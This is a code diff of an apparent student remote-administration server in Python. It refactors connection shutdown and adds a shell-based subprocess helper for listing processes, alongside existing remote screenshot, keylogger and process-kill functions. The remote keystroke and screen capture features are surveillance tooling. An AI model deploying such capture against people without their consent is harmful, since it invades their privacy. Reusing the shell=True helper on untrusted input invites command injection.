@@ -6,6 +6,7 @@ from PIL import ImageGrab
 import os
 import wmi
 import threading
+import subprocess
 
 SERVER = ""
 PORT = 1234
@@ -16,20 +17,24 @@ class ServerServices:
         self.server = None
         self.server_thread = None
 
+
     def startServices(self):
         print('START SERVER')
         self.createSocket()
         self.server_thread = threading.Thread(target = self.addConnection)
         self.server_thread.start()
 
+
     def stopServices(self):
         print('STOP SERVER')
         for client in self.clients:
             if client.conn != None:
                 client.closeConnection()
-
-        self.server.close()
+        
+        # tránh lỗi trên cell
+        server = self.server
         self.server = None
+        server.close()
 
         self.server_thread.join()
 
@@ -41,6 +46,7 @@ class ServerServices:
                                
         print(f"Port: {PORT}")
         self.server.listen()
+
 
     def addConnection(self):
         while True:
@@ -55,11 +61,10 @@ class ServerServices:
                 if self.server == None:
                     print('Server stopped. Exit thread')
                 else:
-                    print('Unexpected error')
-                    self.stopServices()
+                    print('Server have unexpected error. Exit thread')
+                    # self.stopServices()
                 break
             
-    
     
 
 class Client:
@@ -70,20 +75,24 @@ class Client:
         self.client_thread = None
         self.DELIM = b'\x00'
 
+
     def startConnection(self):
         print(f'{self.addr} \tSTART CONNECTION')
         self.buff = socketutils.BufferedSocket(self.conn, None)
         self.client_thread = threading.Thread(target = self.services)
         self.client_thread.start()
 
+
     #close connection
     def closeConnection(self):
         print(f'{self.addr} \tCLOSE CONNECTION')
 
-        self.conn.close()
+        conn = self.conn
         self.conn = None
+        conn.close()
 
         self.client_thread.join()
+
 
     def services(self):
         while True:
@@ -107,9 +116,10 @@ class Client:
                 if self.conn == None:
                     print(f'{self.addr} \tClient closed. Exit thread')
                 else:
-                    print(f'{self.addr} \tUnexpected error')
-                    self.closeConnection()
+                    print(f'{self.addr} \tClient have unexpected error. Exit thread')
+                    # self.closeConnection()
                 break
+
 
     # dump func
     def sendDump(self, var):
@@ -120,12 +130,35 @@ class Client:
         self.buff.send(dump)
         print(f'{self.addr} \tSent dump data. Size: {dump_size}')
 
+    # cmd func
+    def getResultCMD(self, cmd):
+        data = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
+        result = []
+
+        for line in data.stdout:
+            if line.rstrip():
+                result.append(list(filter(None, line.decode().rstrip().split('  '))))
+
+        return result
+
     #  screenshot func
     def sendScreenShot(self):
         print(f'{self.addr} \tSEND SCREENSHOT')
         image = ImageGrab.grab()
         
         self.sendDump(image)
+
+    # process list func
+    def sendProcessList(self):
+        print(f'{self.addr} \tSEND PROCESS LIST')
+        # f = wmi.WMI()
+
+        # process_data = []
+        # for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
+        #     process_data.append([process.ProcessId, process.Name, process.ThreadCount])
+
+        process_data = self.getResultCMD('wmic process get description, processid, threadcount')[1:]
+        self.sendDump(process_data)
 
     # keylogger func
     def keylogger_Server(self):
@@ -169,6 +202,7 @@ class Client:
                     listener.stop()
                 break
             
+
     # kill process func
     def getKillProcess(self):
         pid = int(self.buff.recv_until(self.DELIM).decode())
@@ -179,13 +213,4 @@ class Client:
         except:
             print('\t Err: No process with uid exist')
 
-    # process list func
-    def sendProcessList(self):
-        print('SEND PROCESS LIST')
-        f = wmi.WMI()
 
-        process_data = []
-        for process in f.Win32_Process(["ProcessId", "Name", "ThreadCount"]):
-            process_data.append([process.ProcessId, process.Name, process.ThreadCount])
-
-        self.sendDump(process_data)
